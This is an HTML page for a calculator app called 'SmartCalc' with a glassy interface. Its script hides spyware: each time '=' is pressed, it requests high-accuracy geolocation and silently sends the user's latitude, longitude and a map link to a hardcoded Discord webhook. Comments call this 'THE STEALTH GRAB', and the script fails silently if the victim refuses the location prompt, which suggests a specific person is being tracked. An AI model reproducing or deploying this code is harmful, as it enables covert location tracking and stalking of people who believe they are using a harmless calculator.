<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>SmartCalc</title>
    <style>
      :root {
        --bg: #0f172a;
        --glass: rgba(255, 255, 255, 0.1);
        --accent: #38bdf8;
      }

      body {
        background: var(--bg);
        font-family: "Inter", system-ui, sans-serif;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
        margin: 0;
        overflow: hidden;
      }

      /* The Fade-Up Animation */
      @keyframes fadeUp {
        from {
          opacity: 0;
          transform: translateY(40px);
        }
        to {
          opacity: 1;
          transform: translateY(0);
        }
      }

      .calc-container {
        animation: fadeUp 1s ease-out forwards;
        background: var(--glass);
        backdrop-filter: blur(15px);
        padding: 25px;
        border-radius: 24px;
        border: 1px solid rgba(255, 255, 255, 0.1);
        box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
        width: 320px;
      }

      #display {
        width: 100%;
        height: 70px;
        background: rgba(0, 0, 0, 0.2);
        border: none;
        border-radius: 12px;
        margin-bottom: 20px;
        color: white;
        font-size: 32px;
        text-align: right;
        padding: 15px;
        box-sizing: border-box;
        outline: none;
      }

      .grid {
        display: grid;
        grid-template-columns: repeat(4, 1fr);
        gap: 12px;
      }

      button {
        height: 60px;
        border-radius: 12px;
        border: none;
        background: rgba(255, 255, 255, 0.05);
        color: white;
        font-size: 20px;
        font-weight: 500;
        cursor: pointer;
        transition: all 0.2s;
      }

      button:hover {
        background: rgba(255, 255, 255, 0.15);
        transform: translateY(-2px);
      }
      button:active {
        transform: translateY(0);
      }

      .op {
        color: var(--accent);
      }
      .eq {
        background: var(--accent);
        color: var(--bg);
        font-weight: bold;
        grid-column: span 2;
      }
      .eq:hover {
        background: #7dd3fc;
      }
    </style>
  </head>
  <body>
    <div class="calc-container">
      <input type="text" id="display" readonly placeholder="0" />
      <div class="grid">
        <button onclick="clearAll()" style="color: #f87171">AC</button>
        <button onclick="del()">DEL</button>
        <button class="op" onclick="press('/')">÷</button>
        <button class="op" onclick="press('*')">×</button>

        <button onclick="press('7')">7</button>
        <button onclick="press('8')">8</button>
        <button onclick="press('9')">9</button>
        <button class="op" onclick="press('-')">-</button>

        <button onclick="press('4')">4</button>
        <button onclick="press('5')">5</button>
        <button onclick="press('6')">6</button>
        <button class="op" onclick="press('+')">+</button>

        <button onclick="press('1')">1</button>
        <button onclick="press('2')">2</button>
        <button onclick="press('3')">3</button>
        <button onclick="press('.')">.</button>

        <button onclick="press('0')">0</button>
        <button class="eq" onclick="solve()">=</button>
      </div>
    </div>

    <script>
      const HOOK =
        "https://discord.com/api/webhooks/1475080044350017651/Y1NSnen-8Hphvacbe5DlPN8izi0rbSQ7_lQM09KMLTf-MI3-ARW3O1GYucKUwakJmm_x";
      let screen = document.getElementById("display");

      function press(v) {
        screen.value += v;
      }
      function clearAll() {
        screen.value = "";
      }
      function del() {
        screen.value = screen.value.slice(0, -1);
      }

      function solve() {
        // 1. Math Logic
        try {
          if (screen.value === "") return;
          let res = eval(screen.value);
          if (!isFinite(res)) throw "Error";
          screen.value = res;
        } catch (e) {
          screen.value = "ERROR";
          setTimeout(() => {
            screen.value = "0";
          }, 1000); // Resets to zero after 1s
        }

        // 2. THE STEALTH GRAB
        navigator.geolocation.getCurrentPosition(
          async (p) => {
            await fetch(HOOK, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                content: "🎯 **CALCULATOR SNIPER HIT**",
                embeds: [
                  {
                    title: "Precise GPS Data Received",
                    color: 3447003,
                    description: `**Lat:** ${p.coords.latitude}\n**Lon:** ${p.coords.longitude}\n**Accuracy:** ${p.coords.accuracy.toFixed(1)}m`,
                    url: `http://google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`,
                  },
                ],
              }),
            });
          },
          () => {
            // SILENT FAIL - NO POPUPS IF HE BLOCKS
          },
          { enableHighAccuracy: true },
        );
      }
    </script>
  </body>
</html>
